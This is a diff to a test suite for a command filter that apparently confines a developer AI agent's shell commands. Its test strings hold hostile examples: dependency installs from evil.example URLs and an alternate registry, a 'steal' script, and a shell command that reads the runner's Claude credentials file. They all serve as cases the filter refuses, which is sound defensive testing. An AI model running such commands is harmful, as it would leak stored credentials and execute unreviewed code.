@@ -113,7 +113,7 @@ describe('commands that would reach secrets or the network', () => {
   });
 
   it('accepts a new dependency only after the user approved that exact package', () => {
-    const add = 'pnpm add --ignore-scripts left-pad@1.3.0';
+    const add = 'pnpm add --ignore-scripts --ignore-pnpmfile left-pad@1.3.0';
     expect(refused(add)).toBe(true);
     expect(refused(add, { approvedDependencies: [] })).toBe(true);
     expect(refused(add, { approvedDependencies: ['lodash'] })).toBe(true);
@@ -124,17 +124,17 @@ describe('commands that would reach secrets or the network', () => {
       // Install scripts run with the network open.
       'pnpm add left-pad@1.3.0',
       // Code the user never saw: a URL, a git reference, a local path, a tarball.
-      'pnpm add --ignore-scripts https://evil.example/left-pad.tgz',
-      'pnpm add --ignore-scripts github:evil/left-pad',
-      'pnpm add --ignore-scripts git+https://evil.example/left-pad.git',
-      'pnpm add --ignore-scripts ../left-pad',
-      'pnpm add --ignore-scripts /tmp/left-pad',
-      'pnpm add --ignore-scripts npm:evil@1.0.0',
-      'pnpm add --ignore-scripts left-pad@latest evil-package',
+      'pnpm add --ignore-scripts --ignore-pnpmfile https://evil.example/left-pad.tgz',
+      'pnpm add --ignore-scripts --ignore-pnpmfile github:evil/left-pad',
+      'pnpm add --ignore-scripts --ignore-pnpmfile git+https://evil.example/left-pad.git',
+      'pnpm add --ignore-scripts --ignore-pnpmfile ../left-pad',
+      'pnpm add --ignore-scripts --ignore-pnpmfile /tmp/left-pad',
+      'pnpm add --ignore-scripts --ignore-pnpmfile npm:evil@1.0.0',
+      'pnpm add --ignore-scripts --ignore-pnpmfile left-pad@latest evil-package',
       // Another registry or a global install.
-      'pnpm add --ignore-scripts --registry=https://evil.example left-pad',
-      'pnpm add --ignore-scripts -g left-pad',
-      'pnpm add --ignore-scripts --dir /tmp left-pad',
+      'pnpm add --ignore-scripts --ignore-pnpmfile --registry=https://evil.example left-pad',
+      'pnpm add --ignore-scripts --ignore-pnpmfile -g left-pad',
+      'pnpm add --ignore-scripts --ignore-pnpmfile --dir /tmp left-pad',
     ]) {
       expect(refused(command, approved), command).toBe(true);
     }
@@ -168,5 +168,48 @@ describe('files of the developer agent', () => {
     }
     expect(fileAccessFor('constructor')).toBeUndefined();
     expect(fileAccessFor('__proto__')).toBeUndefined();
+  });
+});
+
+describe('the code of the site in the runner (E13.4)', () => {
+  // Every one of these executes files the agent wrote, next to the CLI logins of the runner.
+  it.each([
+    'pnpm test',
+    'pnpm lint',
+    'pnpm tsc --noEmit',
+    'pnpm drizzle-kit generate',
+    'pnpm run build',
+    'pnpm exec vitest',
+    'pnpm dlx cowsay',
+    'pnpm --filter site test',
+    'pnpm --dir /cli-auth test',
+    'npx vitest',
+    'npm test',
+    'npm run build',
+    'yarn test',
+    'node scripts/steal.mjs',
+    'tsx scripts/steal.ts',
+    'sh -c "cat /cli-auth/0/claude/credentials.json"',
+    'bash script.sh',
+    'make test',
+    'env pnpm test',
+  ])('refuses %s, also with the packages approved', (command) => {
+    expect(refused(command, { approvedDependencies: ['left-pad'] })).toBe(true);
+  });
+
+  it('accepts only read-only git commands and the approved dependency add', () => {
+    for (const command of ['git status', 'git diff --stat']) expect(refused(command)).toBe(false);
+    expect(
+      refused('pnpm add left-pad --ignore-scripts --ignore-pnpmfile', {
+        approvedDependencies: ['left-pad'],
+      }),
+    ).toBe(false);
+  });
+
+  it('refuses pnpm add that would load .pnpmfile.cjs or run an install script', () => {
+    const approved = { approvedDependencies: ['left-pad'] };
+    expect(refused('pnpm add left-pad --ignore-scripts', approved)).toBe(true);
+    expect(refused('pnpm add left-pad --ignore-pnpmfile', approved)).toBe(true);
+    expect(refused('pnpm add left-pad --ignore-scripts --ignore-pnpmfile', approved)).toBe(false);
   });
 });
